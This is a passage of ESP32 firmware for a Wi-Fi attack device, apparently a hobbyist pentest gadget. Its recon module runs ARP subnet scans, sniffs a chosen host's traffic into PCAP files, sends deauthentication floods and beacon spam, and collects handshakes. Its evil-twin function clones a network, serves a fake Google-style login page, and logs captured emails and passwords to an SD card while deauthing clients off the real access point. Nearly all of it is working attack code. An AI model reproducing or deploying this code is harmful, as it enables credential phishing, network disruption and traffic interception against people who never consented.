                if (s.length() > 0 && s != "YourSSID") {
                    ssid = s;
                    pass = p;
                    hidden = h;
                    found_valid = true;
                    break;
                }
            }
        }

        WiFi.mode(WIFI_STA);
        if (found_valid) {
            Serial.printf("[ARP] Connecting to saved network '%s'...\n", ssid.c_str());
            if (hidden)
                WiFi.begin(ssid.c_str(), pass.c_str(), 0, nullptr, true);
            else
                WiFi.begin(ssid.c_str(), pass.c_str());
        } else {
            Serial.println("[ARP] No custom saved network in time_sync, attempting auto-connect via SDK...");
            WiFi.begin();
        }
        arp_waiting_wifi = true;
        arp_wifi_start_ms = millis();
    }
    state = RECON_ARP_SCANNING;
}

static void poll_arp_scan(void) {
    uint32_t now = millis();

    if (arp_waiting_wifi) {
        wl_status_t st = WiFi.status();
        if (st == WL_CONNECTED) {
            arp_waiting_wifi = false;
            IPAddress local = WiFi.localIP();
            IPAddress mask  = WiFi.subnetMask();
            arp_base = ((uint32_t)local) & ((uint32_t)mask);
            Serial.printf("[ARP] WiFi connected! Scanning subnet %d.%d.%d.%d\n",
                local[0]&mask[0], local[1]&mask[1],
                local[2]&mask[2], local[3]&mask[3]);
        } else if (now - arp_wifi_start_ms > ARP_WIFI_TIMEOUT_MS) {
            Serial.println("[ARP] WiFi connection timeout, aborting");
            WiFi.disconnect(true);
            WiFi.mode(WIFI_OFF);
            arp_waiting_wifi = false;
            state = RECON_IDLE;
        }
        return;
    }

    if (!arp_collecting) {
        if (now - arp_last_send_ms < ARP_SEND_INTERVAL_MS) return;
        arp_last_send_ms = now;
        if (arp_scan_idx < 254) {
            struct netif* iface = netif_default;
            if (iface) {
                ip4_addr_t target;
                // lwIP stores IPs little-endian: for subnet x.y.z.0, host .N is stored as
                // (N<<24 | z<<16 | y<<8 | x) so we must place the host index in the MSB
                uint32_t net_le = arp_base; // already little-endian from the & operation
                uint8_t a0 = (net_le      ) & 0xFF;
                uint8_t a1 = (net_le >>  8) & 0xFF;
                uint8_t a2 = (net_le >> 16) & 0xFF;
                uint8_t host_idx = (uint8_t)(arp_scan_idx + 1);
                // reconstruct little-endian: a3 = host_idx
                target.addr = (uint32_t)a0 | ((uint32_t)a1 << 8) | ((uint32_t)a2 << 16) | ((uint32_t)host_idx << 24);
                etharp_request(iface, &target);
                Serial.printf("[ARP] -> %d.%d.%d.%d\n", a0, a1, a2, host_idx);
            }
            arp_scan_idx++;
        } else {
            arp_collecting = true;
            arp_collect_start_ms = now;
            Serial.println("[ARP] Requests sent, collecting replies...");
        }
    } else {
        if (now - arp_collect_start_ms < ARP_COLLECT_WAIT_MS) return;
        struct netif* iface = netif_default;
        if (iface) {
            uint32_t net_le = arp_base;
            uint8_t a0 = (net_le      ) & 0xFF;
            uint8_t a1 = (net_le >>  8) & 0xFF;
            uint8_t a2 = (net_le >> 16) & 0xFF;
            for (int h = 1; h <= 254 && arp_count < MAX_ARP_RESULTS; h++) {
                ip4_addr_t target;
                uint8_t host_idx = (uint8_t)h;
                target.addr = (uint32_t)a0 | ((uint32_t)a1 << 8) | ((uint32_t)a2 << 16) | ((uint32_t)host_idx << 24);
                struct eth_addr* found_mac = nullptr;
                const ip4_addr_t* found_ip  = nullptr;
                int idx = etharp_find_addr(iface, &target, &found_mac, &found_ip);
                if (idx >= 0 && found_mac) {
                    ArpDevice& d = arp_results[arp_count];
                    snprintf(d.ip, sizeof(d.ip), "%u.%u.%u.%u", a0, a1, a2, host_idx);
                    snprintf(d.mac, sizeof(d.mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                        found_mac->addr[0],found_mac->addr[1],found_mac->addr[2],
                        found_mac->addr[3],found_mac->addr[4],found_mac->addr[5]);
                    strncpy(d.vendor, oui_vendor(found_mac->addr), sizeof(d.vendor)-1);
                    d.vendor[sizeof(d.vendor)-1] = '\0';
                    Serial.printf("[ARP] Host: %s  %s  [%s]\n", d.ip, d.mac, d.vendor);
                    arp_count++;
                }
            }
        }
        Serial.printf("[ARP] Done: %d hosts found\n", arp_count);
        state = RECON_IDLE;
    }
}

static void IRAM_ATTR ip_sniff_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* frame = pkt->payload;
    uint16_t len   = pkt->rx_ctrl.sig_len;
    if (len < 36) return;

    uint8_t frame_subtype = (frame[0] >> 4) & 0x0F;
    uint8_t frame_type    = (frame[0] >> 2) & 0x03;
    if (frame_type != 2) return;

    bool has_qos = (frame_subtype & 0x08) != 0;
    int hdr_len = has_qos ? 26 : 24;
    if (len < (uint16_t)(hdr_len + 8 + 20)) return;

    uint8_t* llc = frame + hdr_len;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[6] != 0x08 || llc[7] != 0x00) return;

    uint8_t* ip_hdr = llc + 8;
    if ((ip_hdr[0] >> 4) != 4) return;

    char src_ip[16], dst_ip[16];
    snprintf(src_ip, sizeof(src_ip), "%u.%u.%u.%u",
        ip_hdr[12],ip_hdr[13],ip_hdr[14],ip_hdr[15]);
    snprintf(dst_ip, sizeof(dst_ip), "%u.%u.%u.%u",
        ip_hdr[16],ip_hdr[17],ip_hdr[18],ip_hdr[19]);

    const char* remote = nullptr;
    if (strcmp(src_ip, sniff_target_ip) == 0) remote = dst_ip;
    else if (strcmp(dst_ip, sniff_target_ip) == 0) remote = src_ip;
    if (!remote) return;

    for (int i = 0; i < sniff_unique_ip_count; i++) {
        if (strcmp(sniff_unique_ips[i], remote) == 0) return;
    }
    if (sniff_unique_ip_count < MAX_SNIFF_IPS) {
        strncpy(sniff_unique_ips[sniff_unique_ip_count], remote, 15);
        sniff_unique_ips[sniff_unique_ip_count][15] = '\0';
        sniff_unique_ip_count++;
        Serial.printf("[SNIFF] New remote: %s\n", remote);
    }

    if (sniff_pcap_file) {
        uint32_t ts = (uint32_t)time(nullptr), z = 0;
        uint32_t cap = (len > 2048) ? 2048 : len;
        uint8_t ph[16];
        memcpy(ph+0,&ts,4); memcpy(ph+4,&z,4);
        memcpy(ph+8,&cap,4); memcpy(ph+12,&cap,4);
        sniff_pcap_file.write(ph, 16);
        sniff_pcap_file.write(frame, cap);
    }
}

static void start_ip_sniff(void) {
    if (WiFi.status() != WL_CONNECTED) {
        Serial.println("[SNIFF] Not connected, aborting");
        return;
    }
    sniff_unique_ip_count = 0;
    memset(sniff_unique_ips, 0, sizeof(sniff_unique_ips));
    Serial.printf("[SNIFF] Target: %s\n", sniff_target_ip);

    if (!SD.exists("/traffic")) SD.mkdir("/traffic");
    char safe_ip[16];
    strncpy(safe_ip, sniff_target_ip, sizeof(safe_ip)-1);
    for (int i = 0; safe_ip[i]; i++) if (safe_ip[i] == '.') safe_ip[i] = '_';
    char path[64];
    snprintf(path, sizeof(path), "/traffic/%s_%lu.pcap", safe_ip, (unsigned long)millis());
    sniff_pcap_file = SD.open(path, FILE_WRITE);
    if (sniff_pcap_file) {
        uint8_t gh[24];
        uint32_t magic=0xa1b2c3d4; uint16_t vmaj=2,vmin=4;
        int32_t tz=0; uint32_t sf=0,snap=65535,net=105;
        memcpy(gh+0,&magic,4); memcpy(gh+4,&vmaj,2); memcpy(gh+6,&vmin,2);
        memcpy(gh+8,&tz,4);   memcpy(gh+12,&sf,4);   memcpy(gh+16,&snap,4);
        memcpy(gh+20,&net,4);
        sniff_pcap_file.write(gh, 24);
        Serial.printf("[SNIFF] PCAP: %s\n", path);
    } else {
        Serial.println("[SNIFF] SD open failed, no PCAP");
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(ip_sniff_cb);
    int ch = WiFi.channel();
    esp_wifi_set_channel(ch > 0 ? ch : 6, WIFI_SECOND_CHAN_NONE);
    state = RECON_IP_SNIFFING;
}

static void stop_ip_sniff(void) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (sniff_pcap_file) sniff_pcap_file.close();
    Serial.printf("[SNIFF] Stopped. Unique IPs: %d\n", sniff_unique_ip_count);
    stop_deauth_and_restore();
}

void recon_request_evil_twin(const char* ssid, int channel) {
    recon_request_evil_twin_full(ssid, channel, "", "");
}

void recon_request_evil_twin_full(const char* ssid, int channel,
                                   const char* bssid,
                                   const char* html_path) {
    if (ssid) {
        strncpy(et_ssid, ssid, sizeof(et_ssid) - 1);
        et_ssid[sizeof(et_ssid) - 1] = '\0';
    } else {
        et_ssid[0] = '\0';
    }
    et_channel = channel;
    if (bssid) {
        strncpy(et_target_bssid, bssid, sizeof(et_target_bssid) - 1);
        et_target_bssid[sizeof(et_target_bssid) - 1] = '\0';
    } else {
        et_target_bssid[0] = '\0';
    }
    if (html_path) {
        strncpy(et_html_file_path, html_path, sizeof(et_html_file_path) - 1);
        et_html_file_path[sizeof(et_html_file_path) - 1] = '\0';
    } else {
        et_html_file_path[0] = '\0';
    }
    flag_evil_twin = true;
}

static void start_evil_twin_server(void) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Starting Evil Twin server for \"%s\" on CH%d\n", et_ssid, et_channel);
    web_server_stop();
    delay(200);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP);
    
    IPAddress apIP(172, 0, 0, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(et_ssid, NULL, et_channel);

    dnsServer = new DNSServer();
    dnsServer->start(53, "*", apIP);

    etServer = new AsyncWebServer(80);

    etServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (strlen(et_html_file_path) > 0 && SD.exists(et_html_file_path)) {
            request->send(SD, et_html_file_path, "text/html");
        } else {
            request->send(200, "text/html", DEFAULT_GOOGLE_HTML);
        }
    });

    etServer->on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        String email = "";
        String pass = "";
        if (request->hasParam("email", true)) email = request->getParam("email", true)->value();
        if (request->hasParam("password", true)) pass = request->getParam("password", true)->value();

        if (email.length() > 0 && pass.length() > 0) {
            Serial.printf("[EVIL TWIN] captured: %s / %s\n", email.c_str(), pass.c_str());
            snprintf(et_last_credential, sizeof(et_last_credential), "%s:%s", email.c_str(), pass.c_str());
            et_new_cred = true;

            File csv = SD.open("/evil.csv", FILE_APPEND);
            if (csv) {
                csv.printf("%u,%s,%s,%s\n", (uint32_t)(millis()/1000), et_ssid, email.c_str(), pass.c_str());
                csv.close();
            }
        }
        request->send(200, "text/html", "<h2>Authentication Error</h2><p>Please try again later.</p>");
    });

    etServer->onNotFound([](AsyncWebServerRequest *request) {
        if (strlen(et_html_file_path) > 0 && SD.exists(et_html_file_path)) {
            request->send(SD, et_html_file_path, "text/html");
        } else {
            request->send(200, "text/html", DEFAULT_GOOGLE_HTML);
        }
    });

    etServer->begin();

    
    uint8_t bssid_bytes[6];
    parse_bssid(et_target_bssid, bssid_bytes);
    memcpy(deauth_frame + 10, bssid_bytes, 6);
    memcpy(deauth_frame + 16, bssid_bytes, 6);

    et_deauth_last_ms = 0;
    deauth_frames_sent = 0;
    state = RECON_EVIL_TWIN;
}

static void poll_evil_twin(void) {
    if (dnsServer) {
        dnsServer->processNextRequest();
    }

    uint32_t now = millis();
    if (strlen(et_target_bssid) > 0 && (now - et_deauth_last_ms > 100)) {
        et_deauth_last_ms = now;
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(et_channel, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 5; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        }
        deauth_frames_sent += 5;
        esp_wifi_set_promiscuous(false);
    }
}

static void stop_evil_twin(void) {
    Serial.println("[RECON] Stopping Evil Twin");
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    if (etServer) {
        etServer->end();
        delete etServer;
        etServer = nullptr;
    }
    WiFi.softAPdisconnect(true);
    if (was_web_server_active) {
        web_server_init();
    } else {
        WiFi.mode(WIFI_OFF);
    }
    state = RECON_IDLE;
}

bool recon_is_evil_twin(void) {
    return state == RECON_EVIL_TWIN;
}

bool recon_is_beacon_spamming(void) {
    return state == RECON_BEACON_SPAMMING;
}

int recon_beacon_active_count(void) {
    return beacon_ssid_count;
}

void recon_request_bitgotchi(bool active) {
    if (active && !bitgotchi_active) flag_bitgotchi_start = true;
    if (!active && bitgotchi_active)  flag_bitgotchi_stop  = true;
}

bool recon_is_bitgotchi_active(void)    { return bitgotchi_active; }
int  recon_bitgotchi_friends_count(void){ return bitgotchi_friends; }
int  recon_bitgotchi_handshakes_count(void){ return bitgotchi_handshakes; }
const char* recon_bitgotchi_last_event(void) { return bitgotchi_last_event; }
bool recon_bitgotchi_has_new_event(void) {
    bool r = bitgotchi_new_event;
    bitgotchi_new_event = false;
    return r;
}

const char* recon_et_last_cred(void) {
    return et_last_credential;
}

bool recon_et_has_new_cred(void) {
    bool r = et_new_cred;
    et_new_cred = false;
    return r;
}

void recon_request_deauth_all(void) {
    flag_deauth_all = true;
}

void recon_request_sniffer(int channel) {
    sniffer_channel = channel;
    flag_sniffer = true;
}

void recon_request_deauth_detect(void) {
    flag_deauth_detect = true;
}

int recon_deauth_detect_count(void) {
    return deauth_detected_count;
}

bool recon_is_sniffing(void) {
    return state == RECON_SNIFFING || state == RECON_DEAUTH_DETECTING;
}

int recon_sniffer_packet_count(void) {
    return sniffer_packets;
}

void recon_service_loop(void) {
    if (flag_stop) {
        flag_stop = false;
        flag_wifi_scan = false;
        flag_ble_scan = false;
        flag_deauth = false;
        flag_deauth_all = false;
        flag_sniffer = false;
        flag_deauth_detect = false;
        flag_beacon_spam = false;
        flag_evil_twin = false;
        flag_arp_scan = false;
        flag_ip_sniff = false;

        if (state == RECON_WIFI_SCANNING) {
            WiFi.scanDelete();
            wifi_scan_requested = false;
        } else if (state == RECON_BLE_SCANNING) {
            stop_ble_scan();
        } else if (state == RECON_DEAUTH_SENDING || state == RECON_DEAUTH_ACTIVE || state == RECON_DEAUTH_ALL) {
            stop_deauth_and_restore();
            return;
        } else if (state == RECON_SNIFFING || state == RECON_DEAUTH_DETECTING) {
            esp_wifi_set_promiscuous(false);
            stop_deauth_and_restore();
            return;
        } else if (state == RECON_EVIL_TWIN) {
            stop_evil_twin();
            return;
        } else if (state == RECON_BEACON_SPAMMING) {
            WiFi.softAPdisconnect(true);
            stop_deauth_and_restore();
            return;
        } else if (state == RECON_ARP_SCANNING) {
            WiFi.disconnect(true);
            WiFi.mode(WIFI_OFF);
            arp_waiting_wifi = false;
            state = RECON_IDLE;
            return;
        } else if (state == RECON_IP_SNIFFING) {
            stop_ip_sniff();
            return;
        }
        state = RECON_IDLE;
        Serial.println("[RECON] Stopped");
        return;
    }

    if (state == RECON_IDLE) {
        if (flag_wifi_scan) {
            flag_wifi_scan = false;
            start_wifi_scan();
            return;
        }
        if (flag_ble_scan) {
            flag_ble_scan = false;
            start_ble_scan();
            return;
        }
        if (flag_deauth) {
            flag_deauth = false;
            start_deauth();
            return;
        }
        if (flag_deauth_all) {
            flag_deauth_all = false;
            start_deauth_all();
            return;
        }
        if (flag_sniffer) {
            flag_sniffer = false;
            start_sniffer(sniffer_channel);
            return;
        }
        if (flag_deauth_detect) {
            flag_deauth_detect = false;
            start_deauth_detect();
            return;
        }
        if (flag_beacon_spam) {
            flag_beacon_spam = false;
            start_beacon_spam();
            return;
        }
        if (flag_evil_twin) {
            flag_evil_twin = false;
            start_evil_twin_server();
            return;
        }
        if (flag_arp_scan) {
            flag_arp_scan = false;
            start_arp_scan();
            return;
        }
        if (flag_ip_sniff) {
            flag_ip_sniff = false;
            start_ip_sniff();
            return;
        }
    }

    switch (state) {
        case RECON_WIFI_SCANNING:
            poll_wifi_scan();
            break;
        case RECON_BLE_SCANNING:
            poll_ble_scan();
            break;
        case RECON_DEAUTH_SENDING:
            poll_deauth();
            break;
        case RECON_DEAUTH_ALL:
            poll_deauth_all();
            break;
        case RECON_SNIFFING:
            poll_sniffer();
            break;
        case RECON_DEAUTH_DETECTING:
            poll_sniffer();
            break;
        case RECON_BEACON_SPAMMING:
            poll_beacon_spam();
            break;
        case RECON_EVIL_TWIN:
            poll_evil_twin();
            break;
        case RECON_ARP_SCANNING:
            poll_arp_scan();
            break;
        case RECON_IP_SNIFFING:
            break;
        default:
            break;
    }

    
    if (flag_bitgotchi_start) {
        flag_bitgotchi_start = false;
        bitgotchi_active = true;
        bitgotchi_friends = 0;
        bitgotchi_handshakes = 0;
        bitgotchi_ch_idx = 0;
        bitgotchi_hop_ms = 0;
        bitgotchi_beacon_ms = 0;
        bitgotchi_ap_count = 0;
        memset(bitgotchi_aps, 0, sizeof(bitgotchi_aps));
        snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event), "Started.");
        bitgotchi_new_event = true;
        WiFi.mode(WIFI_AP_STA);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(promisc_cb);
        esp_wifi_set_channel(bitgotchi_channels[0], WIFI_SECOND_CHAN_NONE);
        Serial.println("[BITGOTCHI] Started");
    }

    if (flag_bitgotchi_stop) {
        flag_bitgotchi_stop = false;
        bitgotchi_active = false;
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event), "Stopped.");
        Serial.println("[BITGOTCHI] Stopped");
    }

    if (bitgotchi_active) {
        uint32_t now = millis();
        
        if (now - bitgotchi_hop_ms > 300) {
            bitgotchi_hop_ms = now;
            bitgotchi_ch_idx = (bitgotchi_ch_idx + 1) % 13;
            esp_wifi_set_channel(bitgotchi_channels[bitgotchi_ch_idx], WIFI_SECOND_CHAN_NONE);
            Serial.printf("[BITGOTCHI] Hopping to Ch:%d\n", bitgotchi_channels[bitgotchi_ch_idx]);
        }
        
        if (now - bitgotchi_beacon_ms > 5000) {
            bitgotchi_beacon_ms = now;
            bitgotchi_send_pwngrid_beacon();
            Serial.println("[BITGOTCHI] Broadcasting PWNGRID beacon...");
        }
    }
}
